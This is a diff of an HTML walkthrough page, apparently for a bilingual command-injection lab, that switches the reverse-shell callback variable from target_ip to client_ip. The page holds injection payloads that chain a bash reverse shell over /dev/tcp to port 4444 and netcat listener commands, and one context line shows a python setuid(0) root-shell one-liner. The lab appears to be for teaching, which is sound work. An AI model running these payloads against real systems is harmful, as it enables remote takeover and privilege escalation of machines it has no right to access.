@@ -39,7 +39,7 @@
 rlwrap nc -lvnp 4444
 
 # Payload en el formulario
-127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1'</pre></li>
     </ol>
 
     <h3>Medium</h3>
@@ -55,7 +55,7 @@ rlwrap nc -lvnp 4444
 rlwrap nc -lvnp 4444
 
 # Payload en el formulario
-127.0.0.1 && bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+127.0.0.1 && bash -c 'bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1'</pre></li>
     </ol>
 
     <h3>Hard</h3>
@@ -110,7 +110,7 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></li>
 rlwrap nc -lvnp 4444
 
 # Payload in the form
-127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1'</pre></li>
     </ol>
 
     <h3>Medium</h3>
@@ -126,7 +126,7 @@ rlwrap nc -lvnp 4444
 rlwrap nc -lvnp 4444
 
 # Payload in the form
-127.0.0.1 && bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+127.0.0.1 && bash -c 'bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1'</pre></li>
     </ol>
 
     <h3>Hard</h3>
